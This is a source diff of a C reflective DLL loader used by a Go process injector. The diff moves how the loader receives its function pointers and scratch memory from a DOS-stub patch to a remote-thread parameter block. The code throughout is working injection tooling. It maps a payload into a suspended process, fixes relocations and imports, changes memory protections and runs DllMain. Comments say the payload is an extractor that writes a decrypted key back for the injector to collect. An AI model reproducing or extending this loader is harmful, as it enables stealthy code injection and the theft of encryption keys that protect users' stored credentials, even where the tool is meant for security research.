@@ -19,8 +19,8 @@ typedef struct {
     pfn_NtFlushInstructionCache   NtFlushInstructionCache;
 } resolved_imports;
 
-#define MARK(imgBase, step) do { \
-    *(volatile BYTE *)((BYTE *)(imgBase) + BOOTSTRAP_MARKER_OFFSET) = (BYTE)(step); \
+#define MARK(scratchBase, step) do { \
+    *(volatile BYTE *)((BYTE *)(scratchBase) + BOOTSTRAP_MARKER_OFFSET) = (BYTE)(step); \
 } while (0)
 
 // noinline is load-bearing: if this gets inlined into Bootstrap,
@@ -53,24 +53,25 @@ static ULONG_PTR locate_own_image_base(void)
     return 0;
 }
 
-// read_preresolved_imports pulls the five function pointers the Go injector
-// patched into the payload's DOS stub (see patchPreresolvedImports on the
-// Go side). Returns FALSE if any slot is NULL — indicating a build-stub
-// mismatch between C and Go.
-static BOOL read_preresolved_imports(ULONG_PTR imageBase, resolved_imports *out)
+// read_bootstrap_params pulls the scratch pointer and function pointers from
+// the remote thread parameter block written by the Go injector. The target
+// process is created by us and kept suspended, so passing explicit parameters
+// is clearer than re-discovering imports from the PEB or patching the DOS stub.
+static BOOL read_bootstrap_params(LPVOID lpParameter, resolved_imports *out,
+                                  ULONG_PTR *outScratchBase)
 {
-    out->LoadLibraryA =
-        *(pfn_LoadLibraryA *)(imageBase + BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET);
-    out->GetProcAddress =
-        *(pfn_GetProcAddress *)(imageBase + BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET);
-    out->VirtualAlloc =
-        *(pfn_VirtualAlloc *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET);
-    out->VirtualProtect =
-        *(pfn_VirtualProtect *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET);
-    out->NtFlushInstructionCache =
-        *(pfn_NtFlushInstructionCache *)(imageBase + BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET);
+    if (!lpParameter) return FALSE;
 
-    return out->LoadLibraryA && out->GetProcAddress && out->VirtualAlloc &&
+    BootstrapParams *params = (BootstrapParams *)lpParameter;
+    *outScratchBase = params->scratch_base;
+    out->LoadLibraryA = (pfn_LoadLibraryA)params->LoadLibraryA;
+    out->GetProcAddress = (pfn_GetProcAddress)params->GetProcAddress;
+    out->VirtualAlloc = (pfn_VirtualAlloc)params->VirtualAlloc;
+    out->VirtualProtect = (pfn_VirtualProtect)params->VirtualProtect;
+    out->NtFlushInstructionCache =
+        (pfn_NtFlushInstructionCache)params->NtFlushInstructionCache;
+
+    return *outScratchBase && out->LoadLibraryA && out->GetProcAddress && out->VirtualAlloc &&
            out->VirtualProtect && out->NtFlushInstructionCache;
 }
 
@@ -146,8 +147,8 @@ static void apply_base_relocations(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt)
 }
 
 // link_iat resolves the Import Address Table for each DLL the payload
-// references, using the pre-resolved LoadLibraryA + GetProcAddress the
-// Go injector patched in.
+// references, using the LoadLibraryA + GetProcAddress pointers the Go injector
+// passes in the BootstrapParams block.
 static void link_iat(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
                      const resolved_imports *imp)
 {
@@ -211,9 +212,8 @@ static void set_section_protections(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
 }
 
 // invoke_dllmain calls the payload's DllMain with DLL_PROCESS_ATTACH.
-// lpReserved carries the original raw-image base so DllMain (= the ABE
-// extractor entry) can write the decrypted key back into the scratch
-// region the Go injector reads.
+// lpReserved carries the standalone scratch base so DllMain (= the ABE
+// extractor entry) can write the decrypted key where the Go injector reads.
 static ULONG_PTR invoke_dllmain(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
                                  ULONG_PTR scratchBase)
 {
@@ -227,37 +227,38 @@ __declspec(dllexport) ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter)
 {
     ULONG_PTR imageBase = locate_own_image_base();
     if (imageBase == 0) return 0;
-    MARK(imageBase, BOOTSTRAP_MARK_MZ_FOUND);
 
     resolved_imports imp;
-    if (!read_preresolved_imports(imageBase, &imp)) {
-        MARK(imageBase, BOOTSTRAP_MARK_ERR_IMPORTS);
+    ULONG_PTR scratchBase = 0;
+    if (!read_bootstrap_params(lpParameter, &imp, &scratchBase)) {
+        if (scratchBase) MARK(scratchBase, BOOTSTRAP_MARK_ERR_IMPORTS);
         return 0;
     }
-    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_OK);
+    MARK(scratchBase, BOOTSTRAP_MARK_MZ_FOUND);
+    MARK(scratchBase, BOOTSTRAP_MARK_IMPORTS_OK);
 
     PIMAGE_NT_HEADERS64 newNt;
     BYTE *newBase = allocate_and_copy_image(imageBase, &imp, &newNt);
     if (!newBase) {
-        MARK(imageBase, BOOTSTRAP_MARK_ERR_ALLOC);
+        MARK(scratchBase, BOOTSTRAP_MARK_ERR_ALLOC);
         return 0;
     }
-    MARK(imageBase, BOOTSTRAP_MARK_ALLOC_OK);
-    MARK(imageBase, BOOTSTRAP_MARK_COPIED);
+    MARK(scratchBase, BOOTSTRAP_MARK_ALLOC_OK);
+    MARK(scratchBase, BOOTSTRAP_MARK_COPIED);
 
     apply_base_relocations(newBase, newNt);
-    MARK(imageBase, BOOTSTRAP_MARK_RELOCATED);
+    MARK(scratchBase, BOOTSTRAP_MARK_RELOCATED);
 
     link_iat(newBase, newNt, &imp);
-    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_FIXED);
+    MARK(scratchBase, BOOTSTRAP_MARK_IMPORTS_FIXED);
 
     set_section_protections(newBase, newNt, &imp);
-    MARK(imageBase, BOOTSTRAP_MARK_PERMISSIONS);
+    MARK(scratchBase, BOOTSTRAP_MARK_PERMISSIONS);
 
     imp.NtFlushInstructionCache((HANDLE)-1, NULL, 0);
-    MARK(imageBase, BOOTSTRAP_MARK_CACHE_FLUSHED);
+    MARK(scratchBase, BOOTSTRAP_MARK_CACHE_FLUSHED);
 
-    ULONG_PTR result = invoke_dllmain(newBase, newNt, imageBase);
-    MARK(imageBase, BOOTSTRAP_MARK_DONE);
+    ULONG_PTR result = invoke_dllmain(newBase, newNt, scratchBase);
+    MARK(scratchBase, BOOTSTRAP_MARK_DONE);
     return result;
 }
